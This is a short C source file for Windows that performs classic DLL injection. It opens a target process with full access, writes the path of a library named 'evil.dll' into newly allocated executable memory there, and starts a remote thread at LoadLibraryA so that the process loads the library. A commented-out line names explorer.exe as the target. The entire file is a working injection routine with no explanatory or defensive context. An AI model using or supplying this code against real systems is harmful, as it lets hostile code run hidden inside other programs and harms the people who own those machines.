#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>


int main()
{
    LPCSTR dllLibName = "evil.dll";
    DWORD processId = 0;

    //LPCSTR processName = "explorer.exe";
    //DWORD processId = getProcessId((LPSTR)processName);

    char dllLibFullPath[256];
    GetFullPathName((LPSTR)dllLibName, sizeof(dllLibFullPath), dllLibFullPath, NULL);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    LPVOID dllAllocatedMemory = VirtualAllocEx(hProcess, NULL, strlen(dllLibFullPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, dllAllocatedMemory, dllLibFullPath, strlen(dllLibFullPath) + 1, NULL);
    LPVOID loadLibrary = (LPVOID) GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

    HANDLE remoteThreadHandler = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) loadLibrary, dllAllocatedMemory, 0, NULL);
    CloseHandle(hProcess);

    return 0;
}